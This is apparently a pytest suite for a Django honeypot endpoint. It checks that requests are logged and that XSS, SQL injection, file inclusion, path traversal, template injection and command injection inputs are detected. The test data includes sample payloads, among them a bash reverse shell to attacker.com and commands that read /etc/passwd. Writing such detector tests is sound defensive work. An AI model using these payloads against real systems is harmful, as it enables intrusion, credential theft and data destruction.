from rest_framework import status
from uuid import UUID

from myapp.models import BotEvent, AttackType


class TestHoneypotView:
    """Comprehensive test suite for the HoneypotView endpoint."""

    def test_get_request_creates_bot_event_and_returns_html_form(
        self, api_client, comprehensive_headers, honeypot_url
    ):
        """Test that GET request creates a BotEvent with all fields populated and returns HTML with form."""
        # Include query parameters with email to test email extraction
        query_params = {
            "email": "test@example.com",
            "username": "testuser",
            "message": "Test message",
        }
        response = api_client.get(honeypot_url, query_params, **comprehensive_headers)

        # Assert response
        assert response.status_code == status.HTTP_200_OK
        assert "text/html" in response["Content-Type"]
        assert "Loading..." in response.content.decode()
        assert "form" in response.content.decode().lower()
        assert "ctoken" in response.content.decode()
        assert "username" in response.content.decode()
        assert "message" in response.content.decode()

        # Assert BotEvent was created with all fields
        assert BotEvent.objects.count() == 1
        bot_event = BotEvent.objects.first()

        # Verify all BotEvent fields are present
        assert bot_event.id is not None  # UUID primary key
        assert isinstance(bot_event.id, UUID)

        assert bot_event.method == "GET"
        assert bot_event.request_path == honeypot_url

        # IP and network fields
        assert bot_event.ip_address == "192.168.1.100"

        geo_str = str(bot_event.geo_location)
        assert "US" in geo_str
        assert "New York" in geo_str

        # User agent and browser info
        assert bot_event.agent == "Mozilla/5.0 (Test Browser)"
        assert bot_event.referer == "https://example.com/contact"
        assert bot_event.language == "en-US"

        # Email extraction
        assert bot_event.email == "test@example.com"

        # Request data
        assert bot_event.data is not None
        assert "email" in bot_event.data
        assert bot_event.data["email"] == "test@example.com"
        assert "username" in bot_event.data
        assert "message" in bot_event.data

        # Correlation token
        assert bot_event.correlation_token is not None
        assert isinstance(bot_event.correlation_token, UUID)

        # Timestamp
        assert bot_event.created_at is not None

        # XSS attempted (should be False for clean data)
        assert bot_event.attack_attempted is False
        assert AttackType.objects.count() == 0

    def test_post_request_creates_bot_event_with_correlation_token(
        self,
        api_client,
        request_headers,
        honeypot_url,
        test_correlation_token,
        sample_post_data,
    ):
        """Test that POST request creates BotEvent with correlation token from form."""
        response = api_client.post(
            honeypot_url, data=sample_post_data, **request_headers
        )

        # Assert response
        assert response.status_code == status.HTTP_200_OK
        assert response.data == {"status": "ok"}

        # Assert BotEvent was created
        assert BotEvent.objects.count() == 1
        bot_event = BotEvent.objects.first()
        assert bot_event.method == "POST"
        assert bot_event.correlation_token == test_correlation_token
        assert bot_event.data == sample_post_data
        assert bot_event.request_path == honeypot_url

    def test_xss_detection_in_get_parameters_creates_attack(
        self, api_client, request_headers, honeypot_url
    ):
        """Test that XSS patterns in GET parameters are detected and logged as AttackType."""
        malicious_param = "<script>alert('XSS')</script>"
        response = api_client.get(
            honeypot_url,
            {"username": malicious_param, "message": "normal message"},
            **request_headers,
        )

        assert response.status_code == status.HTTP_200_OK

        # Assert BotEvent was created
        bot_event = BotEvent.objects.first()
        assert bot_event is not None
        assert bot_event.attack_attempted is True

        # Assert AttackType was created
        attacks = AttackType.objects.filter(bot_event=bot_event)
        assert attacks.count() >= 1
        script_attack = attacks.filter(pattern="script_tag", category="XSS").first()
        assert script_attack is not None
        assert script_attack.target_field == "username"
        assert script_attack.category == "XSS"
        assert "<script>" in script_attack.raw_value.lower()

    def test_xss_detection_in_post_data_creates_attack(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that XSS patterns in POST data are detected and logged as AttackType."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "username": "normal_user",
            "message": "<iframe src='javascript:alert(1)'></iframe>",
            "comment": "Test comment",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)

        assert response.status_code == status.HTTP_200_OK

        # Assert BotEvent was created
        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        # Assert AttackType was created for iframe
        attacks = AttackType.objects.filter(bot_event=bot_event)
        assert attacks.count() >= 1
        iframe_attack = attacks.filter(pattern="iframe_tag", category="XSS").first()
        assert iframe_attack is not None
        assert iframe_attack.target_field == "message"
        assert iframe_attack.category == "XSS"
        assert "iframe" in iframe_attack.raw_value.lower()

    def test_email_extraction_from_various_fields(
        self, api_client, request_headers, honeypot_url
    ):
        """Test that email is extracted from various field names."""
        # Test email in 'email' field
        response = api_client.post(
            honeypot_url,
            data={"email": "user@example.com", "message": "Hello"},
            **request_headers,
        )
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.email == "user@example.com"

        # Test email in 'message' field
        BotEvent.objects.all().delete()
        response = api_client.post(
            honeypot_url,
            data={"message": "Contact me at admin@test.com for more info"},
            **request_headers,
        )
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.email == "admin@test.com"

        # Test email in 'username' field (should be extracted from message/body fields)
        BotEvent.objects.all().delete()
        response = api_client.post(
            honeypot_url,
            data={"username": "testuser", "comment": "Email: support@company.org"},
            **request_headers,
        )
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.email == "support@company.org"

    def test_metadata_extraction_from_request_headers(
        self, api_client, request_headers, x_forwarded_for_headers, honeypot_url
    ):
        """Test that IP, agent, referer, and language are extracted from headers."""
        # Test with standard headers
        response = api_client.get(honeypot_url, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.ip_address == "192.168.1.100"
        assert bot_event.agent == "Mozilla/5.0 (Test Browser)"
        assert bot_event.referer == "https://example.com/contact"
        assert bot_event.language == "en-US"

        # Test with X-Forwarded-For (proxy scenario)
        BotEvent.objects.all().delete()
        response = api_client.get(honeypot_url, **x_forwarded_for_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        # Should extract first IP from X-Forwarded-For
        assert bot_event.ip_address == "203.0.113.1"

    def test_correlation_token_links_get_and_post_requests(
        self, api_client, request_headers, honeypot_url
    ):
        """Test that correlation token links GET and POST requests."""
        # First, make a GET request to get the correlation token
        get_response = api_client.get(honeypot_url, **request_headers)
        assert get_response.status_code == status.HTTP_200_OK

        get_event = BotEvent.objects.first()
        ctoken = get_event.correlation_token
        assert ctoken is not None

        # Extract ctoken from HTML response
        html_content = get_response.content.decode()
        # The HTML contains the ctoken in a hidden input
        assert str(ctoken) in html_content

        # Now make a POST request with the same ctoken
        post_data = {
            "ctoken": str(ctoken),
            "username": "testuser",
            "message": "Follow-up message",
        }
        post_response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert post_response.status_code == status.HTTP_200_OK

        # Assert both events exist with same correlation token
        events = BotEvent.objects.filter(correlation_token=ctoken)
        assert events.count() == 2
        assert events.filter(method="GET").exists()
        assert events.filter(method="POST").exists()

    def test_multiple_xss_patterns_detected_in_single_request(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that multiple XSS patterns in different fields are all detected."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "username": "<img src=x onerror=alert(1)>",  # img_onerror pattern
            "message": "<svg onload=alert(2)>",  # svg_tag + event_handler
            "comment": "javascript:alert(3)",  # js_scheme pattern
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        attacks = AttackType.objects.filter(bot_event=bot_event)

        # Should detect multiple patterns
        assert attacks.count() >= 3

        # Verify specific patterns
        assert attacks.filter(
            target_field="username", pattern="img_onerror", category="XSS"
        ).exists()
        assert attacks.filter(
            target_field="message", category="XSS"
        ).exists()  # svg or event_handler
        assert attacks.filter(
            target_field="comment", pattern="js_scheme", category="XSS"
        ).exists()

    def test_sql_injection_detection(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that SQL injection patterns are detected and logged."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "username": "admin' OR '1'='1",
            "password": "UNION SELECT * FROM users",
            "query": "'; DROP TABLE users; --",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event, category="SQLI")
        assert attacks.count() >= 2

        # Verify SQLI patterns
        assert attacks.filter(pattern="or_1_equals_1", category="SQLI").exists()
        assert attacks.filter(pattern="union_select", category="SQLI").exists()
        assert attacks.filter(pattern="sql_comment", category="SQLI").exists()

    def test_local_file_inclusion_detection(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that Local File Inclusion patterns are detected and logged."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "file": "../../../etc/passwd",
            "include": "php://filter/read=string.rot13/resource=index.php",
            "path": "file:///etc/passwd",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event, category="LFI")
        assert attacks.count() >= 2

        # Verify LFI patterns
        assert attacks.filter(pattern="etc_passwd", category="LFI").exists()
        assert attacks.filter(pattern="php_wrapper", category="LFI").exists()
        assert attacks.filter(pattern="file_wrapper", category="LFI").exists()

    def test_command_injection_detection(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that Command Injection patterns are detected and logged."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "cmd": "; ls -la",  # pipe_command: ; followed by ls
            "exec": "| whoami",  # pipe_command: | followed by whoami
            "chain": "test && echo",  # command_chaining: &&
            "chain2": "test || echo",  # command_chaining: ||
            "shell": "$(cat /etc/passwd)",  # subshell: $(...)
            "backtick": "`id`",  # subshell: backticks
            "reverse": "bash -i >& /dev/tcp/attacker.com/4444 0>&1",  # reverse_shell: bash -i
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event, category="CMD")
        assert attacks.count() >= 4

        # Verify CMD patterns
        assert attacks.filter(pattern="pipe_command", category="CMD").exists()
        assert attacks.filter(pattern="command_chaining", category="CMD").exists()
        assert attacks.filter(pattern="subshell", category="CMD").exists()
        assert attacks.filter(pattern="reverse_shell", category="CMD").exists()

    def test_path_traversal_detection(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that Path Traversal patterns are detected and logged."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "file": "../../../etc/passwd",
            "path": "/etc/passwd",
            "encoded": "..%2f..%2f..%2fetc%2fpasswd",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event, category="TRAVERSAL")
        assert attacks.count() >= 2

        # Verify TRAVERSAL patterns
        assert attacks.filter(pattern="dot_dot_slash", category="TRAVERSAL").exists()
        assert attacks.filter(pattern="absolute_path", category="TRAVERSAL").exists()
        assert attacks.filter(
            pattern="encoded_traversal", category="TRAVERSAL"
        ).exists()

    def test_template_injection_detection(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that Server-Side Template Injection patterns are detected and logged."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "template": "{{7*7}}",
            "jinja": "{% if True %}x{% endif %}",
            "smarty": "{if $smarty.version}1{/if}",
            "freemarker": "${7*7}",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event, category="SSTI")
        assert attacks.count() >= 2

        # Verify SSTI patterns
        assert attacks.filter(pattern="jinja2_template", category="SSTI").exists()
        assert attacks.filter(pattern="smarty_template", category="SSTI").exists()
        assert attacks.filter(pattern="freemarker_template", category="SSTI").exists()

    def test_multiple_attack_categories_in_single_request(
        self, api_client, request_headers, honeypot_url, test_correlation_token
    ):
        """Test that multiple attack categories can be detected in a single request."""
        post_data = {
            "ctoken": str(test_correlation_token),
            "xss": "<script>alert('XSS')</script>",
            "sqli": "admin' OR '1'='1",
            "lfi": "../../../etc/passwd",
            "cmd": "; ls -la",
            "traversal": "..%2f..%2fetc%2fpasswd",
            "ssti": "{{7*7}}",
        }

        response = api_client.post(honeypot_url, data=post_data, **request_headers)
        assert response.status_code == status.HTTP_200_OK

        bot_event = BotEvent.objects.first()
        assert bot_event.attack_attempted is True

        attacks = AttackType.objects.filter(bot_event=bot_event)

        # Should detect attacks from multiple categories
        assert attacks.count() >= 6

        # Verify all categories are present
        categories = set(attacks.values_list("category", flat=True))
        assert "XSS" in categories
        assert "SQLI" in categories
        assert "LFI" in categories
        assert "CMD" in categories
        assert "TRAVERSAL" in categories
        assert "SSTI" in categories

    def test_no_xss_in_clean_data_does_not_create_attack(
        self, api_client, request_headers, honeypot_url, clean_post_data
    ):
        """Test that clean data without attacks does not create AttackType objects."""
        response = api_client.post(
            honeypot_url, data=clean_post_data, **request_headers
        )
        assert response.status_code == status.HTTP_200_OK

        # BotEvent should be created
        bot_event = BotEvent.objects.first()
        assert bot_event is not None

        # XSS attempted should be False for clean data
        assert bot_event.attack_attempted is False
        # AttackType objects should not be created
        attacks = AttackType.objects.filter(bot_event=bot_event)
        assert attacks.count() == 0

    def test_edge_cases_empty_data_missing_headers(
        self, api_client, honeypot_url, test_correlation_token
    ):
        """Test edge cases: empty data, missing headers, etc."""
        # Test GET with no query parameters
        response = api_client.get(honeypot_url)
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.method == "GET"
        assert bot_event.data == {}  # Empty QueryDict
        # Django test client sets REMOTE_ADDR to 127.0.0.1 by default
        assert bot_event.ip_address in (None, "127.0.0.1")
        assert bot_event.agent is None
        assert bot_event.referer is None
        assert bot_event.language is None

        # Test POST with minimal data (only ctoken)
        BotEvent.objects.all().delete()
        response = api_client.post(
            honeypot_url, data={"ctoken": str(test_correlation_token)}
        )
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.method == "POST"
        assert "ctoken" in bot_event.data

        # Test POST without ctoken (should still work, ctoken will be None)
        BotEvent.objects.all().delete()
        response = api_client.post(honeypot_url, data={"message": "Test"})
        assert response.status_code == status.HTTP_200_OK
        bot_event = BotEvent.objects.first()
        assert bot_event.correlation_token is None
